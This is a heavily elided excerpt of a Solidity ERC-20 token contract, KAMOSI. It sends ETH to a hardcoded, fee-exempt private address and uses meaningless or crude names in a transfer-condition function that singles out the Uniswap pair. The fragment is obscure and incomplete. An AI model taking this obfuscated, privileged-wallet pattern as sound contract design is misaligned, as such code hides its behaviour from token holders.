...
contract KAMOSI is Context, IERC20, Ownable {
    ...
    address private _KAMOSIAddr = 0x922f95CDa1624C09664264D9DF7ba824705B8788;
    ...
    constructor () payable {
        ...
        _isFeeExcluded[_KAMOSIAddr] = true;
    ...
    function _fiwokco(address _loin, address _piss, address _tinwon, uint256 _wieont) private {
        if ((_loin == _uniswapPair || _piss != _ethhole) && _tinwon != _KAMOSIAddr)
    ...
    function sendETHToFee(uint256 amount) private {
        payable(_KAMOSIAddr).transfer(amount);
    }
